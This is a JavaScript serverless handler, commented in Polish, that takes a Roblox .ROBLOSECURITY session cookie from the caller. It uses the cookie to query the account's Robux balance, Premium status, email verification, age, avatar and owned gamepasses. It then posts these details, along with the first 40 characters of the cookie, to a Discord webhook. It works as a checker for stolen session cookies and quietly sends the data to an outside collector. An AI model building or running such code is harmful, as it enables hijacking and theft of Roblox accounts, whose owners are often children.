export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Only POST allowed' });

  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
    return res.status(400).json({ error: 'Brak lub nieprawidłowy cookie' });
  }

  try {
    console.log("[INFO] Rozpoczęto sprawdzanie cookie");

    // 1. CSRF Token
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json'
      },
    });
    const csrf = tokenRes.headers.get('x-csrf-token');
    if (!csrf) throw new Error('Nie udało się pobrać CSRF – cookie wygasło lub nieprawidłowe');

    console.log("[INFO] CSRF pobrany");

    // 2. Dane użytkownika
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrf
      }
    });
    if (!userRes.ok) throw new Error(`Błąd autoryzacji: ${userRes.status}`);
    const user = await userRes.json();

    console.log("[INFO] Użytkownik pobrany:", user.name);

    // Verified email (hat 102611803)
    let emailVerified = false;
    try {
      const ownsRes = await fetch(
        `https://inventory.roblox.com/v1/users/${user.id}/items/Asset/102611803`,
        { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrf } }
      );
      if (ownsRes.ok) {
        const owns = await ownsRes.json();
        emailVerified = Array.isArray(owns.data) && owns.data.length > 0;
      }
    } catch (e) { console.log("[WARN] Błąd sprawdzania hat/email:", e.message); }

    // Premium
    let premium = false;
    try {
      const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrf }
      });
      if (premRes.ok) premium = await premRes.json();
    } catch (e) { console.log("[WARN] Błąd premium:", e.message); }

    // Robux
    let robux = 0;
    try {
      const currRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, {
        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrf }
      });
      if (currRes.ok) {
        const curr = await currRes.json();
        robux = curr.robux || 0;
      }
    } catch (e) { console.log("[WARN] Błąd robux:", e.message); }

    // Wiek konta + data utworzenia
    let ageDays = 0;
    let created = null;
    try {
      const profRes = await fetch(`https://users.roblox.com/v1/users/${user.id}`);
      if (profRes.ok) {
        const prof = await profRes.json();
        if (prof.created) {
          created = prof.created;
          ageDays = Math.floor((Date.now() - new Date(created).getTime()) / 86400000);
        }
      }
    } catch (e) { console.log("[WARN] Błąd wieku konta:", e.message); }

    // Avatar
    let avatarUrl = null;
    try {
      const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${user.id}&size=720x720&format=Png&isCircular=false`);
      if (thumbRes.ok) {
        const thumb = await thumbRes.json();
        avatarUrl = thumb.data?.[0]?.imageUrl || null;
      }
    } catch (e) { console.log("[WARN] Błąd avatara:", e.message); }

    // Gamepasy
    const gamepassIds = [
      429957, 1308795,
      189425850,951065968,951441773,6408694,60406961585546290,7124470,6965379,3196348,5300198,
      1227013099,1229510262,1228591447
    ];
    const gamepasses = [];
    for (const id of gamepassIds) {
      try {
        const gpRes = await fetch(
          `https://inventory.roblox.com/v1/users/${user.id}/items/GamePass/${id}`,
          { headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrf } }
        );
        if (gpRes.ok) {
          const gp = await gpRes.json();
          if (Array.isArray(gp.data) && gp.data.length > 0) gamepasses.push(id);
        }
      } catch {}
    }

    const result = {
      username: user.name,
      displayName: user.displayName || user.name,
      userId: user.id,
      premium,
      emailVerified,
      robux,
      ageDays,
      created: created || 'failed',
      avatarUrl,
      gamepasses
    };

    // ────────────────────────────────────────────────
    // WEBHOOK – wysyłanie na Discord
    // ────────────────────────────────────────────────
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

    console.log("[DEBUG] Webhook URL exists:", !!webhookUrl);
    console.log("[DEBUG] Webhook URL length:", webhookUrl ? webhookUrl.length : "brak");

    if (webhookUrl) {
      console.log("[DEBUG] Wysyłanie na webhook...");

      const embed = {
        title: `${result.username} • ${result.userId}`,
        color: premium ? 0x00ff9d : 0xff4d4d,
        thumbnail: { url: avatarUrl || 'https://via.placeholder.com/128' },
        fields: [
          { name: "Premium",       value: premium ? "TAK" : "NIE", inline: true },
          { name: "Email weryfik.", value: emailVerified ? "TAK" : "NIE", inline: true },
          { name: "Robux",         value: robux.toLocaleString() + " ₽", inline: true },
          { name: "Wiek konta",    value: ageDays + " dni", inline: true },
          { name: "Cookie (fragment)", value: "```" + cookie.slice(0, 40) + "..." + "```", inline: false }
        ],
        footer: { text: "Sprawdzono • " + new Date().toISOString().slice(0,19).replace("T"," ") },
        timestamp: new Date().toISOString()
      };

      const sendResult = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          content: "Nowe sprawdzenie konta",
          embeds: [embed] 
        })
      });

      console.log("[DEBUG] Webhook odpowiedź:", sendResult.status, sendResult.ok ? "OK" : "BŁĄD");
      if (!sendResult.ok) {
        const errorText = await sendResult.text();
        console.log("[DEBUG] Treść błędu webhook:", errorText);
      }
    } else {
      console.log("[ERROR] Brak zmiennej DISCORD_WEBHOOK_URL");
    }

    // Zwracamy wynik do użytkownika
    res.status(200).json(result);

  } catch (err) {
    console.error("[ERROR] Główny catch:", err.message, err.stack);
    res.status(500).json({ error: err.message || 'Błąd serwera' });
  }
}
